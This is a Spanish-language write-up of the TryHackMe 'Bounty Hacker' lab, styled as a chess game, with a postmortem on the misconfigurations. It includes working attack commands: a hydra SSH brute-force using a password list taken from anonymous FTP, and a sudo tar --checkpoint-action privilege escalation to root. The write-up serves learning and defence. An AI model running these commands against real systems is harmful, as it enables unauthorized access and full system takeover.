```
♟ PARTIDA 006
  BOUNTY HACKER
  TryHackMe · Easy · Linux
```

```bash
$ whoami
> t474_r0b07

$ cat /etc/context
> ftp anónimo con archivos útiles adentro.
> hydra contra ssh.
> tar con sudo.
> cowboy bebop de fondo.
```

---

## `> ♟ APERTURA: lectura del tablero`

```bash
$ cat first_impression.txt
> bounty hacker.
> cazadores de recompensas.
> el sistema dejó las credenciales
> en el primer servicio que tocamos.
```

> La sala tiene estética de Cowboy Bebop. Cazadores de recompensas que viven al límite. El sistema que la representa no vive al límite: dejó un archivo con contraseñas en un FTP anónimo. La estética no coincide con la seguridad.

---

## `> ♞ PIEZA EXPUESTA: reconocimiento`

```bash
$ nmap -sV -sC -A <IP>

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2
80/tcp open  http    Apache 2.4.18
```

```bash
$ ftp <IP>
> anonymous login allowed

$ ls -la
  locks.txt
  task.txt
```

```bash
$ cat task.txt
> usuario: lin

$ cat locks.txt
> [lista de contraseñas]
```

> El FTP anónimo tenía dos archivos. Uno con el nombre de usuario. Otro con el diccionario de contraseñas. El sistema distribuyó sus propias credenciales en el servicio menos protegido de la red. No hace falta más reconocimiento.

---

## `> ♝ HIPÓTESIS: línea de juego`

```bash
$ cat hypothesis.txt
> usuario: lin
> diccionario: locks.txt
> servicio: ssh puerto 22
> herramienta: hydra
> tiempo estimado: segundos
```

---

## `> ♜ INICIATIVA: ruptura`

```bash
$ hydra -l lin -P locks.txt <IP> ssh

[22][ssh] host: <IP>   login: lin   password: [REDACTED]
```

```bash
$ ssh lin@<IP>
$ cat ~/user.txt
> THM{[REDACTED]}
```

> Dentro. El diccionario que dejaron en el FTP contenía su propia contraseña.

---

## `> ♛ REY EXPUESTO: escalada`

```bash
$ sudo -l

> (root) NOPASSWD: /bin/tar
```

> tar con sudo sin contraseña. tar no es solo una herramienta de compresión: tiene flags que ejecutan comandos durante el proceso. GTFOBins lo documenta. Alguien le dio sudo a tar pensando que era inofensivo.

```bash
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

> # whoami
  root
```

---

## `> ♚ JAQUE MATE`

```bash
$ cat /root/root.txt
> THM{[REDACTED]}
```

---

## `> ♜ ANÁLISIS DE LA PARTIDA: ¿dónde perdió el rey?`

```bash
$ cat postmortem.txt

MOVIMIENTO 1: ftp anónimo con credenciales expuestas
MOVIMIENTO 2: contraseña en diccionario propio del sistema
MOVIMIENTO 3: tar con privilegios sudo sin restricción
```

> El sistema guardó sus propias contraseñas en un servicio público y las usó para proteger otro servicio. Es circular. El diccionario era la llave y la llave estaba en la puerta.
>
> tar con sudo es el mismo patrón que vim en Simple CTF: un binario que parece inofensivo hasta que lees su documentación completa.

```bash
$ echo $LESSON
> cualquier binario con sudo es una superficie de ataque.
> tar, vim, less, python, find.
> gtfobins.github.io. siempre.
```

---

> *partida 006 · bounty hacker · jaque mate confirmado*
> *→ [t474-r0b07](https://github.com/t474-r0b07)*

<!--
  dejaron el diccionario en el ftp.
  la contraseña estaba en el diccionario.
  spike spiegel merece mejor infraestructura.
-->
